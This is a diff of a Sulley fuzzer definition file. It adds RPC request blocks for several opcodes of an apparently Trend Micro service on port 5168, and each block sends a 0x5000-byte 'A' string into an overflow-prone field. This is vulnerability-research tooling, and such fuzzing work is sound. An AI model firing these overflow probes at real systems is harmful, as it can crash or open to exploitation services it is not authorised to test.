@@ -102,8 +102,6 @@ if s_block_start("body", encoder=trend_xor_encode):
 
 
 ########################################################################################################################
-s_initialize("5168: 0xa RPC")
-
 # // opcode: 0x00, address: 0x65741030
 # // uuid: 25288888-bd5b-11d1-9d53-0080c83a5c2c
 # // version: 1.0
@@ -117,11 +115,121 @@ s_initialize("5168: 0xa RPC")
 # [in] long arg_6
 # );
 
+s_initialize("5168: op-1")
 if s_block_start("everything", encoder=rpc_request_encoder):
     # [in] long trend_req_num,
-    s_group("subs", values=map(chr, range(1, 50)))
+    s_group("subs", values=map(chr, range(1, 22)))
+    s_static("\x00")        # subs is actually a little endian word
+    s_static("\x01\x00")    # opcode
+
+    # [in][size_is(arg_4)] byte overflow_str[],
+    s_size("the string")
+    if s_block_start("the string", group="subs"):
+        s_static("A"*0x5000, name="arg3")
+        s_block_end()
+
+    # [in] long arg_4,
+    s_size("the string")
+
+    # [in] long arg_6
+    s_static(struct.pack("<L", 0x5000)) # output buffer size
+s_block_end()
+
+
+s_initialize("5168: op-2")
+if s_block_start("everything", encoder=rpc_request_encoder):
+    # [in] long trend_req_num,
+    s_group("subs", values=map(chr, range(1, 19)))
+    s_static("\x00")        # subs is actually a little endian word
+    s_static("\x02\x00")    # opcode
+
+    # [in][size_is(arg_4)] byte overflow_str[],
+    s_size("the string")
+    if s_block_start("the string", group="subs"):
+        s_static("A"*0x5000, name="arg3")
+        #s_string("A"*100, name="arg3")
+        s_block_end()
+
+    # [in] long arg_4,
+    s_size("the string")
+
+    # [in] long arg_6
+    s_static(struct.pack("<L", 0x5000)) # output buffer size
+s_block_end()
+
+
+s_initialize("5168: op-3")
+if s_block_start("everything", encoder=rpc_request_encoder):
+    # [in] long trend_req_num,
+    s_group("subs", values=map(chr, range(1, 85)))
+    s_static("\x00")        # subs is actually a little endian word
+    s_static("\x03\x00")    # opcode
+
+    # [in][size_is(arg_4)] byte overflow_str[],
+    s_size("the string")
+    if s_block_start("the string", group="subs"):
+        s_static("A"*0x5000, name="arg3")
+        #s_string("A"*100, name="arg3")
+        s_block_end()
+
+    # [in] long arg_4,
+    s_size("the string")
+
+    # [in] long arg_6
+    s_static(struct.pack("<L", 0x5000)) # output buffer size
+s_block_end()
+
+
+s_initialize("5168: op-5")
+if s_block_start("everything", encoder=rpc_request_encoder):
+    # [in] long trend_req_num,
+    s_group("subs", values=map(chr, range(0, 25)))
+    s_static("\x00")        # subs is actually a little endian word
+    s_static("\x05\x00")    # opcode
+
+    # [in][size_is(arg_4)] byte overflow_str[],
+    s_size("the string")
+    if s_block_start("the string", group="subs"):
+        s_static("A"*0x5000, name="arg3")
+        #s_string("A"*100, name="arg3")
+        s_block_end()
+
+    # [in] long arg_4,
+    s_size("the string")
+
+    # [in] long arg_6
+    s_static(struct.pack("<L", 0x5000)) # output buffer size
+s_block_end()
+
+
+s_initialize("5168: op-a")
+if s_block_start("everything", encoder=rpc_request_encoder):
+    # [in] long trend_req_num,
+    s_group("subs", values=map(chr, range(1, 49)))
     s_static("\x00")        # subs is actually a little endian word
     s_static("\x0a\x00")    # opcode
+
+    # [in][size_is(arg_4)] byte overflow_str[],
+    s_size("the string")
+    if s_block_start("the string", group="subs"):
+        s_static("A"*0x5000, name="arg3")
+        #s_string("A"*100, name="arg3")
+        s_block_end()
+
+    # [in] long arg_4,
+    s_size("the string")
+
+    # [in] long arg_6
+    s_static(struct.pack("<L", 0x5000)) # output buffer size
+s_block_end()
+
+
+s_initialize("5168: op-1f")
+if s_block_start("everything", encoder=rpc_request_encoder):
+    # [in] long trend_req_num,
+    s_group("subs", values=map(chr, range(0, 25)))
+    s_static("\x00")        # subs is actually a little endian word
+    s_static("\x1f\x00")    # opcode
 
     # [in][size_is(arg_4)] byte overflow_str[],
     s_size("the string")
